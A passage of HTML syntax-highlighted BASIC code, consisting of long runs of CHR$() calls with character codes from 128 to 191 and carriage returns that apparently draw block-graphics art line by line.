class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token 